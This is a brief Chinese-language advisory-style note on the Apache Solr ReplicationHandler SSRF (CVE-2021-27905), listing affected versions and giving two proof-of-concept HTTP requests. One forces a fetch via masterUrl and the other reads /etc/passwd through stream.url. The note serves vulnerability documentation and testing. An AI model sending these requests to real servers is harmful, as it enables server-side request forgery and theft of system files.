# Apache Solr Replication handler SSRF CVE-2021-27905

## 漏洞描述

Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。

参考链接：

* https://nvd.nist.gov/vuln/detail/CVE-2021-27905

## 漏洞影响

```
Apache Solr 7.0.0 - 7.7.3 
Apache Solr 8.0.0 - 8.8.1
```

### 漏洞复现

poc：

```
GET /solr/test/replication?command=fetchindex&masterUrl=http://127.0.0.1/&wt=json&httpBasicAuthUser=&httpBasicAuthPassword= HTTP/1.1
HOST:target
....
```

```
GET http://xxxxx/solr/xxxx/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
HOST:target
...
```

